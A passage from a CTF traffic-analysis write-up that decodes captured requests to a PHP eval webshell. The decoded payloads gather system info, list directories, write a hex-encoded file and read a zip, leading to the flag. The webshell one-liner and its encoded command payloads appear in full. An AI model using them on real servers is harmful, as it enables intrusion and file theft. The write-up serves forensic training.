class="comment">// 检查目录路径是否以根目录符号&quot;/&quot;开头</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$D</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果不是，遍历A到Z的驱动器，如果存在，则添加到R</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">range</span>(<span class="string">&quot;A&quot;</span>, <span class="string">&quot;Z&quot;</span>) <span class="keyword">as</span> <span class="variable">$L</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$R</span> .= <span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 添加制表符作为分隔</span></span><br><span class="line">    <span class="variable">$R</span> .= <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用posix_getegid和posix_getpwuid获取当前用户的用户名，如果函数不存在，则使用get_current_user</span></span><br><span class="line"><span class="variable">$u</span> = (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;posix_getegid&#x27;</span>)) ? @<span class="title function_ invoke__">posix_getpwuid</span>(@<span class="title function_ invoke__">posix_geteuid</span>()) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$usr</span> = (<span class="variable">$u</span>) ? <span class="variable">$u</span>[<span class="string">&#x27;name&#x27;</span>] : @<span class="title function_ invoke__">get_current_user</span>();</span><br><span class="line"><span class="comment">// 将系统信息和用户信息添加到R</span></span><br><span class="line"><span class="variable">$R</span> .= <span class="title function_ invoke__">php_uname</span>();</span><br><span class="line"><span class="variable">$R</span> .= <span class="string">&quot;(<span class="subst">&#123;$usr&#125;</span>)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印结果</span></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$R</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结束分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&lt;-&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终止脚本执行</span></span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>将返回的结果格式化后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|</span><br><span class="line">D:/wamp64/www/upload</span><br><span class="line">C:D:E:</span><br><span class="line">Windows NT DESKTOP-5E59GR7 10.0 build 15063 (Windows 10) AMD64</span><br><span class="line">(SYSTEM)</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure><div class="tag-plugin colorful note" color="orange"><div class="title">需要注意的点</div><div class="body"><p>输出的前面有个<code>-&gt;|</code>，输出的后面有个<code>|&lt;-</code>，可能会影响后续下载文件的内容。</p></div></div></div></details><details class="folder" index="1"><summary><span>查看文件夹D:\wamp64\www\upload</span></summary><div class="body"><p>然后查看了文件夹内容以及权限，发现是<code>777</code>，可以下载文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa=@<span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%<span class="number">2</span>BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=RDpcd2FtcDY0XHd3d1x1cGxvYWQ%<span class="number">3</span>D</span><br></pre></td></tr></table></figure><p>action 如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7</span><br></pre></td></tr></table></figure><p>解码并且格式化后代码为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关闭错误显示</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除脚本执行的时间限制</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭魔术引号</span></span><br><span class="line">@<span class="title function_ invoke__">set_magic_quotes_runtime</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出开始分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-&gt;|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解码通过POST方法传递的路径</span></span><br><span class="line"><span class="variable">$D</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;z1&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试打开目录</span></span><br><span class="line"><span class="variable">$F</span> = @<span class="title function_ invoke__">opendir</span>(<span class="variable">$D</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$F</span> === <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果目录打开失败，输出错误信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR:// Path Not Found Or No Permission!&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化变量用于存储目录和文件列表</span></span><br><span class="line">    <span class="variable">$M</span> = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="variable">$L</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取目录中的每个条目</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$N</span> = @<span class="title function_ invoke__">readdir</span>(<span class="variable">$F</span>)) &#123;</span><br><span class="line">        <span class="variable">$P</span> = <span class="variable">$D</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$N</span>; <span class="comment">// 构建完整的文件路径</span></span><br><span class="line">        <span class="variable">$T</span> = @<span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, @<span class="title function_ invoke__">filemtime</span>(<span class="variable">$P</span>)); <span class="comment">// 获取文件最后修改时间</span></span><br><span class="line">        <span class="variable">$E</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">base_convert</span>(@<span class="title function_ invoke__">fileperms</span>(<span class="variable">$P</span>), <span class="number">10</span>, <span class="number">8</span>), -<span class="number">4</span>); <span class="comment">// 获取文件权限</span></span><br><span class="line">        <span class="variable">$R</span> = <span class="string">&quot;\t&quot;</span> . <span class="variable">$T</span> . <span class="string">&quot;\t&quot;</span> . @<span class="title function_ invoke__">filesize</span>(<span class="variable">$P</span>) . <span class="string">&quot;\t&quot;</span> . <span class="variable">$E</span> . <span class="string">&quot;&quot;</span>; <span class="comment">// 构建输出格式</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据是否为目录，将文件或目录信息添加到相应的变量中</span></span><br><span class="line">        <span class="keyword">if</span> (@<span class="title function_ invoke__">is_dir</span>(<span class="variable">$P</span>)) &#123;</span><br><span class="line">            <span class="variable">$M</span> .= <span class="variable">$N</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$R</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$L</span> .= <span class="variable">$N</span> . <span class="variable">$R</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出目录和文件列表</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$M</span> . <span class="variable">$L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭目录句柄</span></span><br><span class="line">    @<span class="title function_ invoke__">closedir</span>(<span class="variable">$F</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结束分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&lt;-&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终止脚本执行</span></span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>代码功能为获取文件夹的内容，需要参数<code>z1</code>。<br>此处<code>z1</code>：<code>RDpcd2FtcDY0XHd3d1x1cGxvYWQ%3D</code>，解码后为<code>D:\wamp64\www\upload</code>，将返回的结果格式化后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|</span><br><span class="line">./    2017-12-08 11:38:5800777</span><br><span class="line">../    2017-12-08 11:39:1040960777</span><br><span class="line">1.php    2017-12-08 11:33:16330666</span><br><span class="line">flag.txt    2017-12-08 11:35:29170666</span><br><span class="line">hello.zip    2017-12-08 09:32:362240666</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure><div class="tag-plugin colorful note" color="yellow"><div class="body"><p>我们可以注意到有个flag.txt和hello.zip（我们要的flag在中hello.zip，其实flag.txt并没有获取）</p></div></div></div></details><details class="folder" index="2"><summary><span>查看文件夹D:\wamp64\www\</span></summary><div class="body"><p>将<code>z1</code>换为<code>RDpcd2FtcDY0XHd3d1w%3D</code>，解码后为<code>D:\wamp64\www\</code>，将输出格式化后为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|</span><br><span class="line">./    2017-12-08 11:39:1040960777</span><br><span class="line">../    2017-11-17 18:15:0340960777</span><br><span class="line">admin/    2017-11-17 18:15:5381920777</span><br><span class="line">install/    2017-11-17 18:15:5440960777</span><br><span class="line">tools/    2017-11-17 18:15:5440960777</span><br><span class="line">typecho/    2017-12-08 11:39:1040960777</span><br><span class="line">upload/    2017-12-08 11:38:5800777</span><br><span class="line">usr/    2017-11-17 18:15:5400777</span><br><span class="line">var/    2017-11-17 18:15:5440960777</span><br><span class="line">.gitattributes    2015-05-02 05:31:053860666</span><br><span class="line">.gitignore    2015-05-02 05:31:052340666</span><br><span class="line">.gitmodules    2015-05-02 05:31:0500666</span><br><span class="line">.travis.yml    2015-05-02 05:31:051140666</span><br><span class="line">aa.php    2017-10-27 16:02:31260666</span><br><span class="line">changelog.txt    2015-05-02 05:31:0521350666</span><br><span class="line">config.inc.php    2017-10-26 14:01:0415210666</span><br><span class="line">index.php    2015-05-02 05:31:057210666</span><br><span class="line">install.php    2015-05-02 05:31:05474050666</span><br><span class="line">license.txt    2015-05-02 05:31:05149740666</span><br><span class="line">p0.php    2017-10-26 14:31:28260666</span><br><span class="line">README.md    2015-05-02 05:31:052050666</span><br><span class="line">todo.txt    2015-05-02 05:31:051220666</span><br><span class="line">x1n.php    2017-10-26 14:51:13270666</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure></div></details><details class="folder" index="3"><summary><span>查看文件夹D:\wamp64\</span></summary><div class="body"><p>将<code>z1</code>换为<code>RDpcd2FtcDY0XA%3D%3D</code>，解码后为<code>D:\wamp64\</code>，结果格式化为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|</span><br><span class="line">./    2017-11-17 18:15:0340960777</span><br><span class="line">../    2017-12-08 04:45:5340960777</span><br><span class="line">alias/    2017-11-17 18:15:0300777</span><br><span class="line">apps/    2017-11-17 18:15:0300777</span><br><span class="line">bin/    2017-11-17 18:15:2400777</span><br><span class="line">cgi-bin/    2017-11-17 18:15:3200777</span><br><span class="line">lang/    2017-11-17 18:15:3240960777</span><br><span class="line">logs/    2017-11-17 18:15:3200777</span><br><span class="line">scripts/    2017-11-17 18:15:3240960777</span><br><span class="line">tmp/    2017-11-27 06:51:26409600777</span><br><span class="line">www/    2017-12-08 11:39:1040960777</span><br><span class="line">barimage.bmp    2010-12-31 01:39:4247900666</span><br><span class="line">images_off.bmp    2016-08-01 08:21:38269340666</span><br><span class="line">images_on.bmp    2016-08-01 08:22:36269340666</span><br><span class="line">install-english.txt    2016-10-16 07:09:4633800666</span><br><span class="line">license-english.txt    2015-11-06 03:00:2681560666</span><br><span class="line">read_after_install-english.txt    2016-03-08 11:45:2211910666</span><br><span class="line">unins000.dat    2017-10-10 07:11:509723060666</span><br><span class="line">unins000.exe    2017-10-10 07:09:3814011050777</span><br><span class="line">uninstall_services.bat    2017-10-10 07:09:511320777</span><br><span class="line">wampmanager.conf    2017-11-14 14:28:4716360666</span><br><span class="line">wampmanager.exe    2008-09-03 07:46:3612334080777</span><br><span class="line">wampmanager.ini    2017-12-08 11:33:555087820666</span><br><span class="line">wampmanager.tpl    2016-08-22 02:42:00240390666</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure></div></details></div><h3 id="3-Hex-转写-Jpg"><a href="#3-Hex-转写-Jpg" class="headerlink" title="3. Hex 转写 Jpg"></a>3. Hex 转写 Jpg</h3><p>接着在<code>D:\wamp64\www\upload</code>文件夹中新建图片<code>6666.jpg</code>，并且写入二进制信息。</p><details class="tag-plugin colorful folding" color="light"><summary><span>写入图片的php代码</span></summary><div class="body"><p>action 为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskZj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JGM9JF9QT1NUWyJ6MiJdOyRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOyRjPXN0cl9yZXBsYWNlKCJcbiIsIiIsJGMpOyRidWY9IiI7Zm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MikkYnVmLj11cmxkZWNvZGUoIiUiLnN1YnN0cigkYywkaSwyKSk7ZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1Zik%2FIjEiOiIwIik7O2VjaG8oInw8LSIpO2RpZSgpOw</span><br></pre></td></tr></table></figure><p>解码后的 php 为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关闭错误显示</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除脚本执行的时间限制</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭魔术引号</span></span><br><span class="line">@<span class="title function_ invoke__">set_magic_quotes_runtime</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出开始分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-&gt;|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解码通过POST方法传递的文件路径</span></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;z1&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取通过POST方法传递的文件内容</span></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&quot;z2&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清除可能存在的回车和换行符</span></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化缓冲区变量</span></span><br><span class="line"><span class="variable">$buf</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将十六进制编码的字符串转换为原始二进制数据</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>); <span class="variable">$i</span> += <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="variable">$buf</span> .= <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%&quot;</span> . <span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="variable">$i</span>, <span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试写入文件，并根据操作结果输出“1”或“0”</span></span><br><span class="line"><span class="keyword">echo</span> (@<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$f</span>, <span class="string">&quot;w&quot;</span>), <span class="variable">$buf</span>) ? <span class="string">&quot;1&quot;</span> : <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结束分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&lt;-&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终止脚本执行</span></span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure></div></details><p>输入的参数<code>z1</code>（图片名）为<code>D:\wamp64\www\upload\6666.jpg</code>，<code>z2</code>为图片的十六进制信息。<br>我们获取到<code>z2</code>后,将其转换为<code>.jpg</code>格式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># HexToJpg.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_jpg</span>(<span class="params">hex_file_path, jpg_file_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将十六进制文本文件转换为JPEG图片文件。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param hex_file_path: 十六进制文本文件的路径。</span></span><br><span class="line"><span class="string">    :param jpg_file_path: 要保存JPEG图片的路径。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(hex_file_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> hex_file:</span><br><span class="line">        <span class="comment"># 从文件中读取十六进制数据</span></span><br><span class="line">        hex_data = hex_file.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删除任何空白字符（空格、换行符等）</span></span><br><span class="line">    hex_data = hex_data.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将十六进制数据转换为二进制数据</span></span><br><span class="line">    binary_data = <span class="built_in">bytes</span>.fromhex(hex_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将二进制数据写入JPEG文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(jpg_file_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> jpg_file:</span><br><span class="line">        jpg_file.write(binary_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例使用：</span></span><br><span class="line">hex_file_path = <span class="string">r&quot;.\6666.txt&quot;</span>  <span class="comment"># 替换为你的十六进制文件路径</span></span><br><span class="line">jpg_file_path = <span class="string">&quot;6666.jpg&quot;</span>  <span class="comment"># 替换为你希望保存的JPEG文件路径</span></span><br><span class="line">hex_to_jpg(hex_file_path, jpg_file_path)</span><br></pre></td></tr></table></figure><p>转换后的图片如下：<br><img src="/assets/CTF/Misc/traffic_analysis_1/6666.jpg" alt="traffic_analysis_1"></p><p>拿到关键信息<code>Th1s_1s_p4sswd_!!!</code></p><h3 id="4-zip-文件头"><a href="#4-zip-文件头" class="headerlink" title="4. zip 文件头"></a>4. zip 文件头</h3><p>接着读取了<code>D:\wamp64\www\upload\hello.zip</code>文件。</p><details class="tag-plugin colorful folding" color="light"><summary><span>读取zip的php代码</span></summary><div class="body"><p>action 为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D</span><br></pre></td></tr></table></figure><p>解码后脚本为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 关闭错误显示，防止错误信息泄露</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除脚本执行的时间限制，允许脚本长时间运行</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭魔术引号，防止自动添加转义字符</span></span><br><span class="line">@<span class="title function_ invoke__">set_magic_quotes_runtime</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出开始分隔符，用于标识响应开始</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-&gt;|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从POST请求中获取base64编码的文件路径，并进行解码</span></span><br><span class="line"><span class="variable">$F</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;z1&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试以只读模式打开文件</span></span><br><span class="line"><span class="variable">$P</span> = @<span class="title function_ invoke__">fopen</span>(<span class="variable">$F</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 